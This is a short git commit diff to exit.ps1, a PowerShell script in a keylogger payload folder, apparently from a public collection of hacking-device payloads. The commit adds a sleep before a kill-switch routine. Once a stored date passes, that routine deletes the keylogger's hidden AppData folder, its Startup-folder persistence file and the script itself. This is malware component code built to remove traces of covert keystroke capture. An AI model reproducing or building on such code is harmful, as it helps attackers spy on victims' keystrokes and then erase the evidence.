e85a885d605409abf86bae92f66108ef110fc4d9
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-24 23:00:11 -0600

    Update exit.ps1

--- Payloads/Flip-Keylogger/exit.ps1
+++ Payloads/Flip-Keylogger/exit.ps1
@@ -1,4 +1,5 @@
 if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")){
+sleep 10
 Remove-Item "$env:appdata\-locker" -Recurse -Force;
 Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
 Remove-Item "$env:appdata\-exit.ps1"
